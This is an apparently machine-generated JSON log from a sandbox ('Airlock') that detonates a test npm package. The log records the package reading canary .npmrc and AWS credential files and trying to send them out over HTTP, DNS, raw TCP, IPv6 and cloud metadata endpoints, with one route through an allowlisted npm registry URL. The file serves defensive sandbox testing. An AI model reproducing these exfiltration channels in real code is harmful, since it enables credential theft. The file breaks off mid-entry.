+        {
+          "kind": "canary_exfil",
+          "summary": "node put the canary token in a DNS lookup of airlockcanary254ba764ca8b70c1.dns-res.invalid: answered by Airlock inside the VM, never left it",
+          "data": {
+            "stage": "detonate",
+            "pid": 559,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanary254ba764ca8b70c1.dns-res.invalid",
+            "via": "dns",
+            "payload": "airlockcanary254ba764ca8b70c1.dns-res.invalid"
+          },
+          "ts": 1793926030.350103,
+          "id": 47,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "node looked up airlockcanary254ba764ca8b70c1.dns-res.invalid; answered with sinkhole address 198.18.76.253",
+          "data": {
+            "stage": "detonate",
+            "pid": 559,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanary254ba764ca8b70c1.dns-res.invalid",
+            "via": "dns"
+          },
+          "ts": 1793926030.3501046,
+          "id": 48,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "node put the canary token in a DNS lookup of airlockcanary254ba764ca8b70c1.res.catch.darkflib.dev: answered by Airlock inside the VM, never left it",
+          "data": {
+            "stage": "detonate",
+            "pid": 559,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanary254ba764ca8b70c1.res.catch.darkflib.dev",
+            "via": "dns",
+            "payload": "airlockcanary254ba764ca8b70c1.res.catch.darkflib.dev"
+          },
+          "ts": 1793926030.3501077,
+          "id": 49,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "node looked up airlockcanary254ba764ca8b70c1.res.catch.darkflib.dev; answered with sinkhole address 198.18.76.242",
+          "data": {
+            "stage": "detonate",
+            "pid": 559,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanary254ba764ca8b70c1.res.catch.darkflib.dev",
+            "via": "dns"
+          },
+          "ts": 1793926030.350109,
+          "id": 50,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "11 outbound connection attempts refused by the egress policy (refused too fast to attribute to a process)",
+          "data": {
+            "stage": "detonate",
+            "count": 11,
+            "via": "tcp-counter",
+            "source_kind": "watch",
+            "ts_guest": 1793926028.989389
+          },
+          "ts": 1793926030.3501194,
+          "id": 52,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "node tried to connect to raw IP 10.0.0.1:80; not allowlisted, refused by egress policy",
+          "data": {
+            "stage": "detonate",
+            "pid": 559,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "10.0.0.1:80",
+            "via": "connect"
+          },
+          "ts": 1793926030.3501227,
+          "id": 53,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "a process tried to connect to raw IP 172.16.0.5:53; not allowlisted, refused by egress policy",
+          "data": {
+            "stage": "detonate",
+            "pid": null,
+            "cmd": "",
+            "exe": null,
+            "source_kind": "watch",
+            "host": "172.16.0.5:53",
+            "via": "connect"
+          },
+          "ts": 1793926030.3501258,
+          "id": 54,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "a process tried to connect to raw IP 192.168.1.1:80; not allowlisted, refused by egress policy",
+          "data": {
+            "stage": "detonate",
+            "pid": null,
+            "cmd": "",
+            "exe": null,
+            "source_kind": "watch",
+            "host": "192.168.1.1:80",
+            "via": "connect"
+          },
+          "ts": 1793926030.350128,
+          "id": 55,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "a process tried to connect to raw IP 1.1.1.1:53; not allowlisted, refused by egress policy",
+          "data": {
+            "stage": "detonate",
+            "pid": null,
+            "cmd": "",
+            "exe": null,
+            "source_kind": "watch",
+            "host": "1.1.1.1:53",
+            "via": "connect"
+          },
+          "ts": 1793926030.3501298,
+          "id": 56,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "1 outbound connection attempt refused by the egress policy (refused too fast to attribute to a process)",
+          "data": {
+            "stage": "detonate",
+            "count": 1,
+            "via": "tcp-counter",
+            "source_kind": "watch",
+            "ts_guest": 1793926029.0399125
+          },
+          "ts": 1793926030.3501337,
+          "id": 57,
+          "containment": true
+        }
+      ]
+    },
+    {
+      "seconds": 5.3,
+      "window": [
+        1793926032.0301635,
+        1793926037.301706
+      ],
+      "install_exit": 0,
+      "token_matches_canary": true,
+      "probe_token": "AIRLOCKCANARY0E695F5D218FA026",
+      "gateway": "172.16.0.5",
+      "outside": {
+        "v4": "78.141.205.99",
+        "v6": "2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+        "port": 47801,
+        "catcher": {
+          "zone": "catch.darkflib.dev",
+          "v4": "95.179.197.125",
+          "v6": "2001:19f0:7400:219f:5400:7ff:fe03:9747"
+        }
+      },
+      "outside_heard": [],
+      "probe": [
+        {
+          "id": "http-name-443",
+          "what": "HTTPS POST to a name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.19.157.6",
+          "ms": 168
+        },
+        {
+          "id": "http-name-80",
+          "what": "HTTP POST to a name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.19.157.238",
+          "ms": 116
+        },
+        {
+          "id": "http-name-odd-port",
+          "what": "HTTP POST to a name on port 4444",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 109
+        },
+        {
+          "id": "dns-resolver",
+          "what": "token in a DNS name, system resolver",
+          "outcome": "resolved",
+          "detail": "198.19.157.138",
+          "addr": "198.19.157.138",
+          "ms": 94
+        },
+        {
+          "id": "dns-gateway-udp",
+          "what": "token in a DNS name, straight to the gateway",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 108
+        },
+        {
+          "id": "dns-public-udp",
+          "what": "token in a DNS name, straight to 8.8.8.8 (UDP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 95
+        },
+        {
+          "id": "dns-public-tcp",
+          "what": "token in a DNS name, straight to 1.1.1.1 (TCP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 99
+        },
+        {
+          "id": "dns-public-real-udp",
+          "what": "example.com straight to 8.8.8.8 (UDP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 95
+        },
+        {
+          "id": "dns-public-real-tcp",
+          "what": "example.com straight to 1.1.1.1 (TCP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 100
+        },
+        {
+          "id": "dns-gateway-real",
+          "what": "example.com straight to the gateway",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 105
+        },
+        {
+          "id": "raw-ip-https",
+          "what": "HTTPS POST to a public IP (1.1.1.1)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 98 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"1.1.1.1\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "1.1.1.1",
+          "ms": 110
+        },
+        {
+          "id": "raw-ip-http",
+          "what": "HTTP POST to a documentation IP (203.0.113.7)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 102 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"203.0.113.7\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "203.0.113.7",
+          "ms": 101
+        },
+        {
+          "id": "raw-ip-odd-port",
+          "what": "TCP to a public IP on port 4444 (8.8.4.4)",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 95
+        },
+        {
+          "id": "ipv6",
+          "what": "TCP over IPv6 to 2606:4700:4700::1111",
+          "outcome": "connected",
+          "ms": 93
+        },
+        {
+          "id": "ipv6-http",
+          "what": "HTTP GET over IPv6 to Cloudflare (2606:4700:4700::1111)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 107 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"[2606:4700:4700:\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "2606:4700:4700::1111",
+          "ms": 86
+        },
+        {
+          "id": "outside-v4-port",
+          "what": "token over TCP to the lab listener, IPv4",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 79
+        },
+        {
+          "id": "outside-v6-port",
+          "what": "token over TCP to the lab listener, IPv6",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 79
+        },
+        {
+          "id": "outside-v4-http",
+          "what": "HTTP POST to the host's public IPv4, port 80",
+          "outcome": "answered",
+          "detail": "HTTP 403, 104 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"78.141.205.99\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "78.141.205.99",
+          "ms": 85
+        },
+        {
+          "id": "outside-v6-http",
+          "what": "HTTP POST to the host's public IPv6, port 80",
+          "outcome": "answered",
+          "detail": "HTTP 403, 124 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"[2a05:f480:1000:95d:5400:7ff:fe00\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+          "ms": 86
+        },
+        {
+          "id": "icmp",
+          "what": "ping 1.1.1.1 with token bytes in the payload",
+          "outcome": "error",
+          "detail": "spawn ping ENOENT",
+          "ms": 73
+        },
+        {
+          "id": "icmp-socket",
+          "what": "ICMP echo from an unprivileged ping socket (Python)",
+          "outcome": "error",
+          "detail": "PermissionError: [Errno 13] Permission denied",
+          "ms": 87
+        },
+        {
+          "id": "imds-aws",
+          "what": "metadata service, AWS path (169.254.169.254)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 106 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"169.254.169.254\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "169.254.169.254",
+          "ms": 77
+        },
+        {
+          "id": "imds-vultr",
+          "what": "metadata service, Vultr path (169.254.169.254)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 106 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"169.254.169.254\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "169.254.169.254",
+          "ms": 77
+        },
+        {
+          "id": "imds-gcp-name",
+          "what": "metadata service by name (metadata.google.internal)",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.19.157.87",
+          "ms": 89
+        },
+        {
+          "id": "imds-ecs",
+          "what": "container credentials endpoint (169.254.170.2)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 104 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"169.254.170.2\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "169.254.170.2",
+          "ms": 74
+        },
+        {
+          "id": "imds-alibaba",
+          "what": "metadata service, Alibaba (100.100.100.200)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 106 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"100.100.100.200\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "100.100.100.200",
+          "ms": 74
+        },
+        {
+          "id": "gateway-22",
+          "what": "TCP to the gateway (172.16.0.5) port 22",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 68
+        },
+        {
+          "id": "gateway-53",
+          "what": "TCP to the gateway (172.16.0.5) port 53",
+          "outcome": "connected",
+          "ms": 68
+        },
+        {
+          "id": "gateway-80",
+          "what": "TCP to the gateway (172.16.0.5) port 80",
+          "outcome": "connected",
+          "ms": 68
+        },
+        {
+          "id": "gateway-443",
+          "what": "TCP to the gateway (172.16.0.5) port 443",
+          "outcome": "connected",
+          "ms": 68
+        },
+        {
+          "id": "gateway-1080",
+          "what": "TCP to the gateway (172.16.0.5) port 1080",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 68
+        },
+        {
+          "id": "gateway-2019",
+          "what": "TCP to the gateway (172.16.0.5) port 2019",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 68
+        },
+        {
+          "id": "gateway-8000",
+          "what": "TCP to the gateway (172.16.0.5) port 8000",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 68
+        },
+        {
+          "id": "docker-api",
+          "what": "Docker API on 172.17.0.1:2375",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 68
+        },
+        {
+          "id": "private-10",
+          "what": "private range 10.0.0.1:80",
+          "outcome": "connected",
+          "ms": 67
+        },
+        {
+          "id": "private-192",
+          "what": "private range 192.168.1.1:80",
+          "outcome": "connected",
+          "ms": 67
+        },
+        {
+          "id": "registry-url",
+          "what": "token in a search URL on registry.npmjs.org (allowed)",
+          "outcome": "answered",
+          "detail": "HTTP 200, 58 bytes",
+          "server": "cloudflare",
+          "body": "{\"objects\":[],\"total\":0,\"time\":\"2026-11-06T00:47:14.893Z\"}",
+          "addr": "104.16.10.34",
+          "ms": 715
+        },
+        {
+          "id": "catcher-https-name",
+          "what": "HTTPS POST to the catcher by its real name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.19.157.1",
+          "ms": 124
+        },
+        {
+          "id": "catcher-http-name",
+          "what": "HTTP POST to the catcher by its real name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.19.157.65",
+          "ms": 82
+        },
+        {
+          "id": "catcher-name-odd-port",
+          "what": "HTTP POST to the catcher by name, port 4444",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 67
+        },
+        {
+          "id": "catcher-v4-http",
+          "what": "HTTP POST to the catcher's IPv4",
+          "outcome": "answered",
+          "detail": "HTTP 403, 105 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"95.179.197.125\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "95.179.197.125",
+          "ms": 61
+        },
+        {
+          "id": "catcher-v4-https",
+          "what": "HTTPS POST to the catcher's IPv4",
+          "outcome": "answered",
+          "detail": "HTTP 403, 105 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"95.179.197.125\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "95.179.197.125",
+          "ms": 67
+        },
+        {
+          "id": "catcher-v4-tcp",
+          "what": "token over raw TCP to the catcher's IPv4, port 4444",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 54
+        },
+        {
+          "id": "catcher-v4-tcp-53",
+          "what": "token over raw TCP to the catcher's IPv4, port 53",
+          "outcome": "connected",
+          "detail": "sent, no reply",
+          "ms": 553
+        },
+        {
+          "id": "catcher-v6-http",
+          "what": "HTTP POST to the catcher's IPv6",
+          "outcome": "answered",
+          "detail": "HTTP 403, 125 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"[2001:19f0:7400:219f:5400:7ff:fe03\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "2001:19f0:7400:219f:5400:7ff:fe03:9747",
+          "ms": 61
+        },
+        {
+          "id": "catcher-v6-tcp",
+          "what": "token over raw TCP to the catcher's IPv6, port 47801",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 53
+        },
+        {
+          "id": "catcher-dns-resolver",
+          "what": "token in a lookup in the catcher's zone, system resolver",
+          "outcome": "resolved",
+          "detail": "198.19.157.36",
+          "addr": "198.19.157.36",
+          "ms": 47
+        },
+        {
+          "id": "catcher-dns-gateway",
+          "what": "token in a lookup in the catcher's zone, straight to the gateway",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 58
+        },
+        {
+          "id": "catcher-dns-8888",
+          "what": "token in a lookup in the catcher's zone, straight to 8.8.8.8 (UDP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 58
+        },
+        {
+          "id": "catcher-dns-1111-tcp",
+          "what": "token in a lookup in the catcher's zone, straight to 1.1.1.1 (TCP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 58
+        },
+        {
+          "id": "catcher-dns-direct",
+          "what": "token in a lookup sent straight to the catcher (UDP 53)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 58
+        },
+        {
+          "id": "catcher-dns-direct-tcp",
+          "what": "token in a lookup sent straight to the catcher (TCP 53)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 58
+        },
+        {
+          "id": "catcher-icmp",
+          "what": "ping the catcher with token bytes in the payload",
+          "outcome": "error",
+          "detail": "spawn ping ENOENT",
+          "ms": 44
+        }
+      ],
+      "recorded": [
+        {
+          "kind": "canary_exfil",
+          "summary": "POST http://h80.exfil-probe.invalid/x carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.exfil-probe.invalid",
+            "url": "http://h80.exfil-probe.invalid/x",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARY0E695F5D218FA026\n[default]\naws_access_key_id = AKIA5F5D218FA026\naws_secret_access_key = AIRLOCKCANARY0E695F5D218FA026/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926035.6213872,
+          "id": 6,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "GET http://metadata.google.internal/computeMetadata/v1/ (0 bytes): answered by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "metadata.google.internal",
+            "url": "http://metadata.google.internal/computeMetadata/v1/",
+            "method": "GET",
+            "bytes": 0,
+            "payload": "",
+            "user_agent": "",
+            "source_kind": "sinkhole"
+          },
+          "ts": 1793926035.621394,
+          "id": 7,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "POST http://h80.catch.darkflib.dev/x?t=AIRLOCKCANARY0E695F5D218FA026 carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.catch.darkflib.dev",
+            "url": "http://h80.catch.darkflib.dev/x?t=AIRLOCKCANARY0E695F5D218FA026",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARY0E695F5D218FA026\n[default]\naws_access_key_id = AKIA5F5D218FA026\naws_secret_access_key = AIRLOCKCANARY0E695F5D218FA026/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926035.6213973,
+          "id": 8,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "POST https://h443.exfil-probe.invalid/x carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.exfil-probe.invalid",
+            "url": "https://h443.exfil-probe.invalid/x",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARY0E695F5D218FA026\n[default]\naws_access_key_id = AKIA5F5D218FA026\naws_secret_access_key = AIRLOCKCANARY0E695F5D218FA026/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926035.6213999,
+          "id": 9,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "POST https://h443.catch.darkflib.dev/x?t=AIRLOCKCANARY0E695F5D218FA026 carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.catch.darkflib.dev",
+            "url": "https://h443.catch.darkflib.dev/x?t=AIRLOCKCANARY0E695F5D218FA026",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARY0E695F5D218FA026\n[default]\naws_access_key_id = AKIA5F5D218FA026\naws_secret_access_key = AIRLOCKCANARY0E695F5D218FA026/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926035.6214018,
+          "id": 10,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "DNS lookup of AIRLOCKCANARY0E695F5D218FA026.dns-gw.invalid carried the canary token: answered NXDOMAIN by Airlock, never left the host",
+          "data": {
+            "stage": "detonate",
+            "host": "AIRLOCKCANARY0E695F5D218FA026.dns-gw.invalid",
+            "payload": "AIRLOCKCANARY0E695F5D218FA026.dns-gw.invalid",
+            "source_kind": "dns",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926035.6214046,
+          "id": 11,
+          "containment": true
+        },
+        {
+          "kind": "dns_blocked",
+          "summary": "DNS lookup of example.com went straight to the gateway, bypassing Airlock's resolver: refused, never left the host",
+          "data": {
+            "stage": "detonate",
+            "host": "example.com",
+            "payload": "example.com",
+            "source_kind": "dns"
+          },
+          "ts": 1793926035.6214066,
+          "id": 12,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "DNS lookup of AIRLOCKCANARY0E695F5D218FA026.gw.catch.darkflib.dev carried the canary token: answered NXDOMAIN by Airlock, never left the host",
+          "data": {
+            "stage": "detonate",
+            "host": "AIRLOCKCANARY0E695F5D218FA026.gw.catch.darkflib.dev",
+            "payload": "AIRLOCKCANARY0E695F5D218FA026.gw.catch.darkflib.dev",
+            "source_kind": "dns",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926035.6214085,
+          "id": 13,
+          "containment": true
+        },
+        {
+          "kind": "canary_read",
+          "summary": "probe.js read canary /home/node/.npmrc",
+          "data": {
+            "stage": "detonate",
+            "path": "/home/node/.npmrc",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214104,
+          "id": 14,
+          "containment": true
+        },
+        {
+          "kind": "canary_read",
+          "summary": "probe.js read canary /home/node/.aws/credentials",
+          "data": {
+            "stage": "detonate",
+            "path": "/home/node/.aws/credentials",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214118,
+          "id": 15,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h443.exfil-probe.invalid; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.exfil-probe.invalid",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214135,
+          "id": 16,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h80.exfil-probe.invalid; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.exfil-probe.invalid",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214159,
+          "id": 17,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach odd.exfil-probe.invalid:4444; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.exfil-probe.invalid:4444",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.621418,
+          "id": 18,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to odd.exfil-probe.invalid",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.exfil-probe.invalid",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214197,
+          "id": 19,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 1.1.1.1; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "1.1.1.1",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214216,
+          "id": 20,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 1.1.1.1",
+          "data": {
+            "stage": "detonate",
+            "host": "1.1.1.1",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.621423,
+          "id": 21,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 203.0.113.7; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "203.0.113.7",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214247,
+          "id": 22,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 203.0.113.7",
+          "data": {
+            "stage": "detonate",
+            "host": "203.0.113.7",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.621426,
+          "id": 23,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach [2606:4700:4700::1111]; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "[2606:4700:4700::1111]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214287,
+          "id": 24,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 78.141.205.99; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "78.141.205.99",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.62143,
+          "id": 25,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 78.141.205.99",
+          "data": {
+            "stage": "detonate",
+            "host": "78.141.205.99",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.621432,
+          "id": 26,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach [2a05:f480:1000:95d:5400:7ff:fe00:80d0]; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "[2a05:f480:1000:95d:5400:7ff:fe00:80d0]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214347,
+          "id": 27,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+          "data": {
+            "stage": "detonate",
+            "host": "2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.621437,
+          "id": 28,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 169.254.169.254; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "169.254.169.254",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214416,
+          "id": 30,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach metadata.google.internal; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "metadata.google.internal",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214437,
+          "id": 31,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 169.254.170.2; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "169.254.170.2",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.621446,
+          "id": 32,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 100.100.100.200; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "100.100.100.200",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214485,
+          "id": 33,
+          "containment": true
+        },
+        {
+          "kind": "egress_allowed",
+          "summary": "probe.js contacted allowlisted registry.npmjs.org",
+          "data": {
+            "stage": "detonate",
+            "host": "registry.npmjs.org",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214504,
+          "id": 34,
+          "containment": false
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js sent canary credentials to allowlisted registry.npmjs.org in a request URL: it reached that host",
